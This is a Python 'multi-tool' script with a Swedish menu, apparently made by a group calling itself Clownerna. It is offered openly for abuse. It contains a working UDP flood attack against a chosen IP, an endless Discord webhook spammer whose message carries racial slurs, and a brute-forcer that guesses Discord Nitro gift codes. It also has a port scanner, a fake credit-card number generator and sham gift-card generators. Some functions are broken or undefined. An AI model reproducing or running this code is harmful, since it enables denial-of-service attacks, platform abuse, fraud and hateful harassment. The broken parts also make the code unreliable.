# Clownerna 2023
#gjord av farmoronlyfans

import random
import string
import requests
import colorama
from colorama import Fore, Style
import socket
import time
from time import time, sleep
from faker import Faker
from tqdm import tqdm
import tkinter as tk
from tkinter import messagebox
from datetime import date, timedelta
import os
import subprocess
from concurrent.futures import ThreadPoolExecutor 


colorama.init()

m = colorama.Fore.MAGENTA
w = colorama.Fore.WHITE
black = colorama.Fore.LIGHTBLACK_EX
y = colorama.Fore.LIGHTYELLOW_EX
r = colorama.Fore.LIGHTRED_EX
g = colorama.Fore.GREEN
lb = colorama.Fore.LIGHTBLUE_EX

ascii_art = f"""
 {r}        __                                         
  _____/ /___ _      ______  ___  _________  ____ _
 / ___/ / __ \ | /| / / __ \/ _ \/ ___/ __ \/ __ `/
/ /__/ / /_/ / |/ |/ / / / /  __/ /  / / / / /_/ / 
\___/_/\____/|__/|__/_/ /_/\___/_/  /_/ /_/\__,_/  
                                                   
                                                                               
                                                                                 
"""


def gencode():
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(19))

class NitroGenerator:
    def __init__(self):
        self.codes = []
        self.check()

    def check(self):
        while True:
            code = gencode()
            self.codes.append(code)
            response = requests.get(
                "https://discord.com/api/v7/entitlements/gift-codes/" + code + "?with_application=false&with_subscription_plan=true")
            data = response.json()
            if data["message"] == 'Unknown Gift Code':
                print(f"{m}[{r}Invalid{m}] {r}https://discord.gift/{code}{r}")
            else:
                print(f"{m}[{g}Might be Valid{m}] {g}https://discord.gift/{code}{g}")
                with open("workedcodes.txt", "a+") as file:
                    file.write("\n" + code)

def g(rolls):
    data = "qwertyuioplkjhgfdsazxcvbnm1234567890QWERTYUIOPLKJHGFDSAZXCVBNM"
    result = ""
    while rolls >= 1:
        c = random.choice(data)
        result = c + result
        rolls = rolls - 1
    return f"{Fore.RED}{result}{Fore.RESET}"



def delete_webhook():
    print(Fore.CYAN + "Webhook Deletion")
    print(Style.RESET_ALL)
    print("")
    
    webhook_url = input_custom(f"{m}[{w}>>>{m}] {black}Enter the URL of the webhook you want to delete: {y}")
    
    try:
        print(f"{m}[{w}CLOWN{m}] {w}Raderar alla neger webhooks...")
        requests.delete(webhook_url)
        print(f"{m}[{g}SUCCESS{m}] {g}Webhook deleted successfully.{w}")
    except requests.exceptions.RequestException as e:
        print(f"{m}[{w}!!{m}] {r}Error deleting webhook: {e}{r}")
    
    input_custom(f"{m}[{w}>>>{m}] Press Enter to return to the main menu.")





def steam_card_generator():
    print(Fore.CYAN + "Steam Gift Card Generator")
    print(Style.RESET_ALL)
    print("")
    print(Fore.YELLOW + "How many Steam gift card codes do you want to generate?")
    print(Style.RESET_ALL)

    while True:
        nn = input(">")
        try:
            n = int(nn)
            if n > 0:
                break
            else:
                print(Fore.RED + "Please enter a positive number.")
                print(Style.RESET_ALL)
        except ValueError:
            print(Fore.RED + "Invalid input. Please enter a valid number.")
            print(Style.RESET_ALL)

    print("")
    print(Fore.GREEN + f"-----Generating {n} Steam Gift Card Codes-----")
    print(Style.RESET_ALL)

    for _ in range(n):
        code = gencode()
        print(Fore.YELLOW + code)
        with open("steam_codes.txt", "a+") as file:
            file.write("\n" + code)

    print("")
    print(Fore.GREEN + "-----Generation completed-----")
    print(Style.RESET_ALL)

    input("Press Enter to return to the main menu...")





def gift_card_generator():
    print(Fore.CYAN + "Multiple Gift Card Generator")
    print(Style.RESET_ALL)
    print("")
    print(Fore.YELLOW + "What Giftcard you need to generate?")
    print(Style.RESET_ALL)

    tt = input().lower()  

    print("")
    print(Fore.YELLOW + "How many of them?")
    print(Style.RESET_ALL)

    
    while True:
        nn = input(">")
        try:
            n = int(nn)
            if n > 0:
                break
            else:
                print(Fore.RED + "Please enter a positive number.")
                print(Style.RESET_ALL)
        except ValueError:
            print(Fore.RED + "Invalid input. Please enter a valid number.")
            print(Style.RESET_ALL)

    print("")
    print(Fore.GREEN + f"-----Generating {tt} Gift Cards-----")
    print(Style.RESET_ALL)

    for x in range(n):
        print("")
        print(Fore.YELLOW + g(4) + "-" + g(6) + "-" + g(4))
        print(Style.RESET_ALL)

    print("")
    print(Fore.GREEN + "-----Generation completed-----")
    print(Style.RESET_ALL)

    input("Press Enter to return to the main menu...")




def xbox_card_generator():
    print(Fore.CYAN + "Xbox Gift Card Generator")
    print(Style.RESET_ALL)
    print("")
    print(Fore.YELLOW + "How many Xbox gift card codes do you want to generate?")
    print(Style.RESET_ALL)

    while True:
        nn = input(">")
        try:
            n = int(nn)
            if n > 0:
                break
            else:
                print(Fore.RED + "Please enter a positive number.")
                print(Style.RESET_ALL)
        except ValueError:
            print(Fore.RED + "Invalid input. Please enter a valid number.")
            print(Style.RESET_ALL)

    print("")
    print(Fore.GREEN + f"-----Generating {n} Xbox Gift Card Codes-----")
    print(Style.RESET_ALL)

    for _ in range(n):
        code = gencode()
        print(Fore.YELLOW + code)
        with open("xbox_codes.txt", "a+") as file:
            file.write("\n" + code)

    print("")
    print(Fore.GREEN + "-----Generation completed-----")
    print(Style.RESET_ALL)

    
    input("Press Enter to return to the main menu...")




def roblox_card_generator():
    print(Fore.CYAN + "Roblox Gift Card Generator")
    print(Style.RESET_ALL)
    print("")
    print(Fore.YELLOW + "How many Roblox gift card codes do you want to generate?")
    print(Style.RESET_ALL)

   
    while True:
        nn = input(">")
        try:
            n = int(nn)
            if n > 0:
                break
            else:
                print(Fore.RED + "Please enter a positive number.")
                print(Style.RESET_ALL)
        except ValueError:
            print(Fore.RED + "Invalid input. Please enter a valid number.")
            print(Style.RESET_ALL)

    print("")
    print(Fore.GREEN + f"-----Generating {n} Roblox Gift Card Codes-----")
    print(Style.RESET_ALL)

    for _ in range(n):
        code = gencode()
        print(Fore.YELLOW + code)
        with open("roblox_codes.txt", "a+") as file:
            file.write("\n" + code)

    print("")
    print(Fore.GREEN + "-----Generation completed-----")
    print(Style.RESET_ALL)

    
    input("Press Enter to return to the main menu...")


                    

def disclaimer_message():
    disclaimer = (
        "Disclaimer:\n\n"
        "CLOWNERNA2023 // FARMORONLYFANS. "
    )
    messagebox.showinfo("Disclaimer", disclaimer)

def input_custom(prompt):
    root = tk.Tk()
    root.withdraw()
    return input(prompt)

def find_website_ip():
    website = input_custom(f"{m}[{w}>>>{m}] {black}Enter the website address to find its IP: {y}")
    try:
        ip_address = socket.gethostbyname(website)
        print(f"{m}[{w}CLOWN{m}] {w}IP address of {y}{website}{w} is: {lb}{ip_address}{w}")
    except socket.gaierror:
        print(f"{m}[{w}!!{m}] {r}Failed to resolve the IP address of {y}{website}{r}")
    input_custom(f"{m}[{w}>>>{m}] Press Enter to return to the main menu.")


import requests
import time

def spam_webhook(webhook_url):
    message = "@everyone Grabbarna hälsar era fitt niggers :D, https://discord.gg/a2QHcQv8Vu https://tenor.com/view/saussi%C3%A7on-explode-boom-gif-16089684"
    try:
        while True:
            data = requests.post(webhook_url, json={'content': message})
            print(f"Skickar spam till fitt servern : {data.status_code}")
            time.sleep(0.02)
    except KeyboardInterrupt:
        print("Slutade")





class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force  
        self.threads = threads  

        self.client = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        self.total = 0
        interval = 0.05
        bytediff = 8
        mb = 1000000
        gb = 1000000000

        print(f"UDP Flood Attack on {self.ip}. Press Ctrl+C to stop.")
        now = time()
        while self.on:
            try:
                self.client.sendto(self.data, (self.ip, self._randport()))
                self.sent += self.len
            except:
                pass

            now2 = time()
            if now + 1 >= now2:
                continue

            size = round(self.sent * bytediff / mb)
            self.total += self.sent * bytediff / gb * interval
            print(f"{round(size)} Mb/s - Total: {round(self.total, 1)} Gb.", end='\r')
            self.sent = 0
            now += 1

    def stop(self):
        self.on = False

    def _randport(self):
        return self.port or randint(1, 65535)

def generate_fake_information():
    fake = Faker()
    print(f"{m}[{w}Fake Information{m}]")
    print(f"{m}[{w}Name{m}] {lb}{fake.name()}")
    print(f"{m}[{w}Email{m}] {lb}{fake.email()}")
    print(f"{m}[{w}IP Address{m}] {lb}{fake.ipv4()}")
    print(f"{m}[{w}Location{m}] {lb}{fake.city()}, {fake.country()}")

def generate_credit_card_expiry_date():
    today = date.today()
    expiry_date = today + timedelta(days=random.randint(365, 365 * 5))
    return expiry_date.strftime("%m/%y")

def generate_credit_card_numbers():
    fake = Faker()
    print(f"{m}[{w}CLOWN{m}] {w}How many credit card numbers do you want to generate?")
    try:
        num_cards = int(input_custom(f"{m}[{w}>>>{m}] {black}Enter the number of credit card numbers to generate: {y}"))
    except ValueError:
        print(f"{m}[{w}!!{m}] {r}Invalid input. Please enter a valid number.{r}")
        return

    print(f"\n{m}[{w}CLOWN{m}] {w}Generated Credit Card Information:")
    for _ in range(num_cards):
        print(f"{m}[{w}Credit Card Number{m}] {lb}{fake.credit_card_number()}")
        print(f"{m}[{w}Credit Card Expiry Date{m}] {lb}{generate_credit_card_expiry_date()}")
        print(f"{m}[{w}Credit Card Security Code{m}] {lb}{fake.credit_card_security_code()}")
        print()

def port_scanner():
    target_ip = input_custom(f"{m}[{w}>>>{m}] {black}Enter the target IP address: {y}")
    min_port = int(input_custom(f"{m}[{w}>>>{m}] {black}Enter the starting port: {y}"))
    max_port = int(input_custom(f"{m}[{w}>>>{m}] {black}Enter the ending port: {y}"))

    open_ports = []
    print(f"{m}[{w}CLOWN{m}] {w}Scanning ports on {y}{target_ip}{w}...")
    for port in tqdm(range(min_port, max_port + 1), desc=f"{m}[{w}CLOWN{m}] {w}Progress", unit="port"):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                result = s.connect_ex((target_ip, port))
                if result == 0:
                    open_ports.append(port)
        except KeyboardInterrupt:
            break
        except Exception:
            pass

    if open_ports:
        print(f"{m}[{w}CLOWN{m}] {g}Open ports on {y}{target_ip}{g}: {lb}{', '.join(map(str, open_ports))}{w}")
    else:
        print(f"{m}[{w}CLOWN{m}] {w}No open ports found on {y}{target_ip}{w}")

    input_custom(f"{m}[{w}>>>{m}] Press Enter to return to the main menu.")

def run_pinger_script():
    print(f"{m}[{w}CLOWN{m}] {w}Starting Pinger...")
    try:
        subprocess.run(["python", "pinger.py"])
    except FileNotFoundError:
        print(f"{m}[{w}!!{m}] {r}pinger.py not found. Make sure the file exists in the current directory.{r}")
    except Exception as e:
        print(f"{m}[{w}!!{m}] {r}Error occurred while running pinger.py: {e}{r}")

def ping_ip():
    target_ip = input_custom(f"{m}[{w}>>>{m}] {black}Enter the IP address to ping: {y}")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2) 
            result = s.connect_ex((target_ip, 80))
            if result == 0:
                print(f"{m}[{w}CLOWN{m}] {g}The IP address {y}{target_ip}{g} is reachable.{w}")
                spam_webhook(target_ip)
            else:
                print(f"{m}[{w}CLOWN{m}] {r}The IP address {y}{target_ip}{r} is not reachable.{w}")
                spam_webhook(target_ip)
    except socket.gaierror:
        print(f"{m}[{w}!!{m}] {r}Invalid IP address format.{r}")
    except socket.timeout:
        print(f"{m}[{w}ClOWN{m}] {r}The IP address {y}{target_ip}{r} timed out.{w}")
    except Exception as e:
        print(f"{m}[{w}!!{m}] {r}Error: {e}{r}")
    input_custom(f"{m}[{w}>>>{m}] Press Enter to return to the main menu.")

def start_scansub_script():
    print(f"{m}[{w}CLOWN{m}] {w}Starting scansub.py...")
    try:
        subprocess.run(["python", "scansub.py"])
    except FileNotFoundError:
        print(f"{m}[{w}!!{m}] {r}scansub.py not found. Make sure the file exists in the current directory.{r}")
    except Exception as e:
        print(f"{m}[{w}!!{m}] {r}Error occurred while running scansub.py: {e}{r}")

def display_menu():
    purple_number = Fore.RED
    reset_color = Fore.RESET

    print("\nVälj en:")
    print(f"{m}[{purple_number}1{m}] {w}Ta reda på en hemsidans IP")
    print(f"{m}[{purple_number}2{m}] {w}Webhook knullare")
    print(f"{m}[{purple_number}3{m}] {w}UDP Attack")
    print(f"{m}[{purple_number}4{m}] {w}Internet Test")
    print(f"{m}[{purple_number}5{m}] {w}Generate Fake Information")
    print(f"{m}[{purple_number}6{m}] {w}Generate Credit Card Numbers")
    print(f"{m}[{purple_number}7{m}] {w}Port Skanner")
    print(f"{m}[{purple_number}8{m}] {w}Nitro Gen")
    print(f"{m}[{purple_number}9{m}] {w}IP PINGER")
    print(f"{m}[{purple_number}10{m}] {w}Start scansub.py")
    print(f"{m}[{purple_number}11{m}] {w}Amazon Card Generator")
    print(f"{m}[{purple_number}12{m}] {w}Roblox Card Generator")
    print(f"{m}[{purple_number}13{m}] {w}Xbox Card Generator")
    print(f"{m}[{purple_number}14{m}] {w}Steam Gift card generator")
    print(f"{m}[{purple_number}15{m}] {w}Radera en webhook ")
    print(f"{m}[{purple_number}0{m}] {w}Exit")

    



def main():
    disclaimer_message()

    print(f"{m}{ascii_art}")
    print(f"{m}[{w}CLOWN{m}] {w}LADDAR skripts...")
    for _ in tqdm(range(25), desc=f"{m}[{w}CLOWN{m}] {w}Laddar...", unit="step"):
        sleep(0.2)
    print(f"{m}[{w}CLOWN{m}] {g}Clownerna2023.{w}")
    print(f"{m}[{w}CLOWN{m}] {g} https://discord.gg/NyEtmmrYMe .{w}")


    while True:
        display_menu()

        try:
            choice = int(input_custom(f"{m}[{w}>>>{m}] {black}Enter your choice: {y}"))
        except ValueError:
            print(f"{m}[{w}!!{m}] {r}Invalid choice. Please enter a valid number.{r}")
            continue

        if choice == 1:
            find_website_ip()
        elif choice == 2:
            webhook_url = input_custom(f"{m}[{w}>>>{m}] {black}Enter the webhook URL: {y}")
            spam_webhook(webhook_url) 
        elif choice == 3:
            ip = input_custom(f"{m}[{w}>>>{m}] {black}Enter the target IP address: {y}")
            port = int(input_custom(f"{m}[{w}>>>{m}] {black}Enter the target port (default is 80): {y}") or "80")
            force = int(input_custom(f"{m}[{w}>>>{m}] {black}Enter the force (default is 1250): {y}") or "1250")
            threads = int(input_custom(f"{m}[{w}>>>{m}] {black}Enter the number of threads (default is 35): {y}") or "35")
            attacker = Brutalize(ip, port, force, threads)
            attacker.flood()
        elif choice == 4:
            ping_ip()
        elif choice == 5:
            generate_fake_information()
        elif choice == 6:
            generate_credit_card_numbers()
        elif choice == 7:
            port_scanner()
        elif choice == 8:
            NitroGenerator()
        elif choice == 9:
            run_pinger_script()
        elif choice == 10:
            start_scansub_script()
        elif choice == 11:
            amazon_card_generator()
        elif choice == 12:
            roblox_card_generator()
        elif choice == 13:
            xbox_card_generator()
        elif choice == 14:  
            steam_card_generator()
        elif choice == 15:  
            delete_webhook()
        elif choice == 0:
            break
        else:
            print(f"{m}[{w}!!{m}] {r}Invalid choice. Please enter a valid number.{r}")

if __name__ == "__main__":
    main()

